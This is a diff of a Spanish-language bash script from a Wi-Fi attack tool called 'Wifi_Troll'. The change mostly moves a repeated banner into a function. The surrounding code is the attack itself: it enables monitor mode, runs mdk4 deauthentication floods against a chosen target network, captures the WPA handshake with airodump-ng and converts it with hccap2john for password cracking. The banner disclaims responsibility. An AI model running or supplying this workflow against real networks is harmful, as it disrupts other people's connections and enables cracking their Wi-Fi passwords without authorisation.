@@ -1,21 +1,25 @@
 #!bin/bash
 
-clear
-echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
+function Title {
+	clear
+	echo
+	echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
+	echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
+	echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
+	echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
+	echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
+	echo "                           \/                   /_____/                                       "
+	echo "                                               ¯\_(ツ)_/¯"
+	echo "                              __________________________________________________"					
+	echo "                                ︻デ═一  Created by: XDeadHackerX v2.0  ︻デ═一 " 
+	echo "          -------------------------------------------------------------------------------------------"
+	echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
+	echo "          -------------------------------------------------------------------------------------------"
+	echo
+	echo
+}
+
+Title
 echo "[4] Extraer el  HandShake  de una Red Wifi"
 echo 
 sudo airmon-ng
@@ -61,22 +65,7 @@ echo "--------------->""      |"
 sleep 1
 echo "--------------------->""|"
 echo "======================="
-clear
-echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
+Title
 echo "[#] Copia el BSSID y Ch del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
 echo
 sudo gnome-terminal --geometry 80x24+1300+20 -- sudo sudo wash -2 -5 -a -i $interfaz2
@@ -95,22 +84,7 @@ clear
 sudo gnome-terminal --geometry 80x24+1300+20 -- bash requisitos/4.2.sh
 sudo gnome-terminal --geometry 80x24+1300+1000 -- sudo timeout 10s mdk4 $interfaz2 d -B $bssid -c $ch
 sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg -w $bssid
-clear
-echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
+Title
 echo "[#] Ultimos ajustes y Resultado"
 sudo pkill gnome-terminal >/dev/null
 sudo rm -r $bssid-01.csv
@@ -129,22 +103,7 @@ sudo hccap2john requisitos/resultados/$bssid/$bssid-02.hccap > requisitos/result
 echo "El HandShake se a guardado en: requisitos/resultados/$bssid/$bssid-01.cap"
 echo
 read -p "[*] Pulsa (Enter) para Salir:" exitt
-clear
-echo
-echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
-echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
-echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
-echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
-echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
-echo "                           \/                   /_____/                                       "
-echo "                                               ¯\_(ツ)_/¯"
-echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
-echo "          -------------------------------------------------------------------------------------------"
-echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
-echo "          -------------------------------------------------------------------------------------------"
-echo
-echo
+Title
 echo "[#] Desactivando Modo Monitor"
 echo
 sudo ifconfig $interfaz2 down >/dev/null
